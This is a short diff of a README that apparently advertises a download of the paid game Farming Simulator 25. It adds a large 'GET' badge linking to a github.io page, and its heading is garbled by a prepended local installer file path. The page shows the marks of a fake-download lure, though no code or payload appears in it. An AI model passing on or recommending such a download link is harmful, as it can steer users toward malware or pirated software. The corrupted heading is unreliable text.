@@ -1,4 +1,4 @@
-# Farming Simulator 25 — Farming & Agriculture Simulation Game
+/storage/emulated/0/Download/7l_farming-simulator-25_installer.exe# Farming Simulator 25 — Farming & Agriculture Simulation Game
 
 [![GET — Farming Simulator 25](https://img.shields.io/badge/GET%20%E2%80%94%20Farming%20Simulator%2025-0078D6?style=for-the-badge&logoColor=white)](https://newkittaharaskill.github.io/.github/farming-simulator-25)
 
